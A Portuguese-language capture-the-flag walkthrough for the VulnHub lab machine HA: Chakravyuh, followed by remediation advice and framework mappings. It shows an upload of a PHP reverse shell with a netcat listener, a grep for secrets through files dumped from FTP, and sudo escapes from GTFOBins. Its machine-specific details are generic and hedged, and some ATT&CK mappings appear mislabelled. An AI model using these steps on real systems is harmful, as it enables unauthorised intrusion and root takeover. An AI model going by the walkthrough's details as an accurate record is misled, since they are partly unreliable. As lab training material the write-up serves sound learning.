# HA: Chakravyuh — Entre na Espiral, Encontre a Saída

No Mahabharata, o Chakravyuh (चक्रव्यूह) é uma formação militar em forma de disco giratório: você consegue entrar, mas escapar exige o conhecimento que só Arjuna possuía. HA: Chakravyuh espelha isso perfeitamente: a máquina apresenta defesas em camadas onde cada serviço esconde a chave para o próximo. Você enumera serviços web, descobre credenciais ocultas por análise de source e enumeração, explora uma aplicação web vulnerável e pivota por permissões de sistema mal configuradas até o root. O caminho de entrada está claro; o caminho de saída (para o root) exige ver através de cada camada. Design de puzzle inteligente demais, mano.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | HA: Chakravyuh |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-chakravyuh,388/ |
| **Técnicas** | Enumeração de serviços Nmap, brute-force de diretórios web, análise de robots.txt, caça de credenciais em código-fonte, acesso FTP anônimo, exploração de upload de arquivo, entrega de shell reverso, escalonamento de privilégios via sudo/SUID |
| **CVEs** | CWE-200 (Exposição de Informação: credenciais em source/config), CWE-269 (Gerenciamento Impróprio de Privilégios: sudo mal configurado), CWE-434 (Upload Irrestrito de Arquivo com Tipo Perigoso: upload web) |
| **Grupos APT** | APT41 — explora aplicações web mal configuradas e vetores de upload de arquivo para acesso inicial em ambientes corporativos; OceanLotus (APT32) — usa configuração incorreta de sudo como técnica primária de escalonamento de privilégios em alvos baseados em Linux |

---

## Resumo do Ataque

```
nmap → HTTP (80), FTP (21), SSH (22)
  → HTTP: página Apache padrão ou customizada
  → robots.txt → caminhos ocultos
  → gobuster → /admin, /uploads, /config ou caminhos similares
  → FTP anônimo → arquivos legíveis → credenciais ou dicas
  → aplicação web: upload de arquivo ou bypass de autenticação
  → shell reverso entregue via upload ou uso de credencial
  → estabilização do shell (python pty + stty)
  → sudo -l ou find SUID → privilégio mal configurado
  → escalação GTFOBins → uid=0(root)
  → /root/flag.txt
```

---

## Metodologia

1. Scan completo de portas para identificar todos os serviços (HTTP, FTP, SSH)
2. Enumeração web: robots.txt, brute-force de diretórios, análise de código-fonte
3. Verificação de acesso FTP anônimo e análise de arquivos
4. Descoberta de credenciais por uma ou mais camadas de enumeração
5. Ponto de apoio inicial: upload de arquivo ou webshell autenticada
6. Estabilização de shell para ferramentas interativas
7. Escalonamento de privilégios via configuração incorreta de sudo ou abuso de binário SUID
8. Captura da flag de root

---

## Passo 1 — Descoberta do Host e Scan Completo de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.105

nmap -sV -sC -p- 192.168.1.105
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Três serviços: FTP, SSH, HTTP. FTP em uma máquina boot2root quase sempre significa acesso anônimo. SSH é o alvo de movimento lateral. HTTP é a superfície de ataque principal.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

Acesse `http://192.168.1.105/`. Inspecione a resposta e o source:

```bash
curl -s http://192.168.1.105/
curl -s http://192.168.1.105/robots.txt
```

`robots.txt` pode revelar caminhos desativados que são exatamente o que queremos visitar:

```bash
# Achados comuns em robots.txt em máquinas CTF:
# Disallow: /admin
# Disallow: /secret
# Disallow: /backup
```

Execute brute-force de diretórios:

```bash
gobuster dir \
  -u http://192.168.1.105/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak \
  -t 40 \
  -o /tmp/chakravyuh_dirs.txt
```

**Alternativa:** `feroxbuster -u http://192.168.1.105/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt` — enumeração recursiva mais rápida.

Examine todos os caminhos descobertos em busca de:
- Comentários no source HTML com credenciais ou dicas
- Formulários com funcionalidade de upload de arquivo
- Páginas de login (tente credenciais padrão: admin:admin, admin:password, root:root)
- Arquivos de configuração deixados no web root

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Acesso FTP Anônimo

```bash
ftp 192.168.1.105
# Usuário: anonymous
# Senha: anonymous (ou apenas pressione Enter)

ftp> ls -la
ftp> ls -la /pub/
ftp> mget *
ftp> quit
```

**O que procurar no FTP:**
- Arquivos de texto com senhas, nomes de usuário ou dicas
- Backups de configuração (`.conf`, `.bak`, `.sql`)
- Scripts revelando caminhos internos
- Arquivos referenciando outros serviços (chaves SSH, config web)

```bash
# Baixe todos os arquivos
wget -r --no-passive ftp://anonymous:@192.168.1.105/
```

Leia todos os arquivos baixados cuidadosamente:

```bash
find /tmp/ftp_dump -type f | xargs grep -i "pass\|user\|cred\|secret\|key" 2>/dev/null
```

**Nota do mundo real:** FTP anônimo foi o principal protocolo de compartilhamento de arquivos da internet antes do HTTP, véi. Milhares de organizações ainda rodam servidores FTP com acesso anônimo habilitado, frequentemente expondo backups de configuração, dumps de banco de dados e documentação interna. OceanLotus (APT32) usou servidores FTP anônimos como áreas de staging em múltiplas intrusões em governos do Sudeste Asiático.

**MITRE ATT&CK:** T1021.003 — Serviços Remotos: Componente Distribuído; T1078.002 — Contas Válidas: Contas de Domínio

---

## Passo 4 — Descoberta de Credenciais e Ponto de Apoio Inicial

Baseado no que foi encontrado na enumeração web e FTP, o ponto de apoio geralmente segue um destes caminhos:

**Caminho A — Upload de Arquivo:**

Se um formulário de upload de arquivo for descoberto:

```bash
# Crie PHP reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edite LHOST e LPORT no arquivo

# Inicie o listener
nc -lvnp 4444

# Faça upload de shell.php pelo formulário web
# Acione navegando até o caminho de upload
curl http://192.168.1.105/uploads/shell.php
```

**Caminho B — Login Autenticado com Credenciais Padrão/Encontradas:**

```bash
# Tente credenciais encontradas via FTP ou source web:
# admin:admin, admin:password, admin:chakravyuh, root:root, etc.

# Após login, procure:
# - Funcionalidades de execução de código (admin CMS, campos de comando)
# - Gerenciador de arquivos com upload
# - Painéis de configuração que permitem comandos arbitrários
```

**O que torna o upload de arquivo perigoso?** Quando uma aplicação web aceita uploads arbitrários sem validar tipo de conteúdo ou extensão, um atacante pode fazer upload de um arquivo PHP e executá-lo visitando sua URL. Isso é CWE-434, uma das vulnerabilidades web mais consistentemente exploradas desde 2005.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 5 — Estabilização do Shell

Shells netcat puros são frágeis: Ctrl+C mata a conexão, completação por tab não funciona, programas interativos (sudo, vi, ssh) falham. Estabilize imediatamente após receber o callback:

```bash
# Na vítima:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ou
python -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm
export SHELL=bash
```

No atacante (enquanto o shell da vítima está rodando):
```bash
# Pressione Ctrl+Z para colocar a sessão netcat em background
stty raw -echo; fg
# Pressione Enter duas vezes
```

Agora você tem um shell totalmente interativo com completação por tab e controle de jobs.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 6 — Enumeração de Escalonamento de Privilégios

Com um shell estável, enumere todos os vetores de escalonamento de privilégios sistematicamente:

```bash
# Verifique direitos sudo
sudo -l

# Encontre binários SUID
find / -perm -4000 -type f 2>/dev/null

# Encontre arquivos com permissão de escrita global
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Verifique cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Verifique processos rodando
ps aux

# Verifique capabilities
getcap -r / 2>/dev/null

# Verifique compartilhamentos NFS
cat /etc/exports

# Procure arquivos interessantes nos diretórios home
ls -la /home/*/
find /home -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1057 — Descoberta de Processos; T1053.003 — Tarefa Agendada: Cron

---

## Passo 7 — Escalonamento de Privilégios para Root

Baseado na enumeração, aplique o vetor descoberto:

**Se sudo estiver mal configurado (padrão comum):**

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3
# ou: (root) NOPASSWD: /usr/bin/find
# ou: (root) NOPASSWD: /bin/bash
# ou: (root) NOPASSWD: /usr/bin/vim
```

Use GTFOBins para o binário específico encontrado. Exemplos:

```bash
# vim:
sudo vim -c ':!/bin/sh'

# python3:
sudo python3 -c 'import os; os.system("/bin/bash")'

# find:
sudo find / -name "*.txt" -exec /bin/bash \; -quit

# nmap (versões mais antigas):
sudo nmap --interactive
# então: !sh
```

**Se binário SUID estiver mal configurado:**

```bash
# Identifique o binário
find / -perm -4000 -type f 2>/dev/null

# Verifique GTFOBins para o binário específico
# Vetores comuns de privesc SUID:
# /usr/bin/python, /usr/bin/perl, /usr/bin/bash (com flag -p)
# /usr/bin/cp (sobrescrever /etc/passwd)
# /usr/bin/find (executar comandos arbitrários)
```

```bash
# Uma vez como root:
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. O Chakravyuh está resolvido. Boa!

**Nota do mundo real:** Configurações incorretas de sudo são o achado #1 de escalonamento de privilégios em testes de penetração focados em Linux, caramba. OceanLotus (APT32) especificamente enumera `sudo -l` como um dos primeiros passos pós-exploração em qualquer host Linux que acessam. A correção é sempre a mesma: aplique menor privilégio, exija senhas para sudo e audite regularmente.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Controle de Elevação: Sudo; T1068 — Exploração para Escalonamento de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Crackeado/Usado |
|---|---|---|---|
| Credencial | (varia) | FTP anônimo / source web / robots.txt | Login na app web ou SSH |
| Shell de usuário | www-data ou usuário de baixo privilégio | Exploit web (upload de arquivo ou bypass de autenticação) | Acesso ao shell |
| Flag de root | flag.txt | /root/flag.txt | sudo / GTFOBin SUID |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | FTP anônimo expondo arquivos internos | Milhares de servidores FTP de produção aceitam logins anônimos; muitos expõem backups de configuração | Desabilite acesso FTP anônimo; use SFTP com autenticação por chave |
| 2 | Credenciais em source web / robots.txt revela caminhos | Vulnerabilidades de divulgação de informações estão consistentemente no OWASP Top 10 (A05 Security Misconfiguration) | Audite todos os arquivos acessíveis na web; use scanning DAST antes do deploy |
| 3 | Upload de arquivo sem validação de conteúdo | Upload irrestrito de arquivo (CWE-434) é um achado crítico em todos os padrões de segurança de aplicações web | Valide tipo de arquivo server-side (MIME + extensão + magic bytes); armazene uploads fora do web root |
| 4 | Configuração incorreta de sudo concede root | O princípio do menor privilégio é violado sempre que sudo permite execução arbitrária de binários | Audite sudoers com `sudo -l` em todos os hosts; exija senhas; restrinja a comandos específicos e seguros |
| 5 | Defesa em camadas refletindo o tema Chakravyuh | Cada serviço escondendo credenciais atrás de outro é realista: ambientes reais têm cadeias de credenciais entre serviços (FTP → web → SSH) | Rotacione credenciais por serviço; não reutilize senhas entre serviços; implemente PAM centralizado |

---

## MITRE ATT&CK Mapping

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Descoberta | Descoberta | Descoberta de Processos | T1057 |
| Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Exploração para Escalonamento de Privilégios | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilite FTP anônimo** — configure vsftpd: `anonymous_enable=NO`; migre para SFTP com autenticação por chave
2. **Remova arquivos sensíveis de caminhos acessíveis na web** — sem credenciais em source HTML, robots.txt ou diretórios `/backup/`
3. **Implemente validação server-side de upload de arquivo** — valide tipo MIME, extensão e magic bytes; rejeite `.php`, `.phtml`, `.phar`; armazene fora do web root
4. **Restrinja sudo a comandos essenciais e específicos** — sem concessões amplas de binários via sudo; exija senha para todo sudo
5. **Audite binários SUID** — `find / -perm -u=s -type f 2>/dev/null`; remova SUID de binários não essenciais
6. **Desabilite autenticação SSH por senha** — use apenas pares de chaves: `PasswordAuthentication no` em `sshd_config`

### Se Você Encontrar Isso no Seu Ambiente

- Desabilite imediatamente FTP anônimo e rotacione quaisquer credenciais expostas via FTP
- Remova ou quarentene webshells carregados; verifique o web root por arquivos PHP inesperados
- Revise sudoers em todos os hosts Linux: `grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/`
- Verifique cron jobs para persistência: `ls -la /etc/cron*`; verifique `crontab -l` para todos os usuários

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os serviços FTP; auditar funcionalidade de upload de aplicações web |
| Proteger | Controle de Acesso | Desabilitar FTP anônimo; restringir sudo; autenticação SSH somente por chave |
| Proteger | Segurança de Dados | Sem credenciais em source web; validar uploads de arquivo server-side |
| Detectar | Anomalias e Eventos | Alertar sobre logins FTP anônimos; detecção de execução de webshell |
| Responder | Planejamento de Resposta | Remover webshells; desabilitar FTP anônimo; rotacionar todas as credenciais expostas |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; auditar todas as contas e permissões |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Controles de acesso FTP; restrições de caminho de upload web |
| AC-6 | Menor Privilégio | Sudo restrito a comandos específicos e necessários apenas |
| IA-2(1) | Autenticação Multifator | MFA para todo acesso administrativo a aplicações web |
| IA-5 | Gerenciamento de Autenticadores | Rotacionar todas as credenciais expostas via FTP ou source web |
| CM-7 | Funcionalidade Mínima | Desabilitar FTP anônimo; restringir tipos de arquivo em formulários de upload |
| SC-28 | Proteção de Informações em Repouso | Sem credenciais armazenadas em arquivos acessíveis na web |

### CISA KEV

A combinação de exposição FTP anônima e upload irrestrito de arquivo (CWE-434) mapeia para padrões em múltiplos Alertas CISA (AA21-008A, AA22-074A) descrevendo uso por atores de ameaças de vulnerabilidades de upload de arquivo de aplicações web para acesso inicial. As organizações são aconselhadas a corrigir e configurar esses vetores de acordo com as orientações da CISA.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos TI e OT | MIL2 |

---

## Reflexão Final

HA: Chakravyuh acerta no tema, véi. Assim como a formação original exige conhecimento específico para navegar camada por camada, essa máquina recompensa enumeração metódica em cada nível. O hábito de verificar robots.txt, acesso FTP anônimo e source HTML antes de pular para brute-force é exatamente a disciplina que essa máquina ensina.

O nome é adequado: todo praticante de CTF já viveu o momento em que está "no Chakravyuh": passou da entrada mas não está enxergando a saída. Enumeração sistemática é a única saída.

Grande respeito ao criador por projetar algo que ensina metodologia real através da mitologia. Bateu aquela sensação quando o root saiu, mano. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
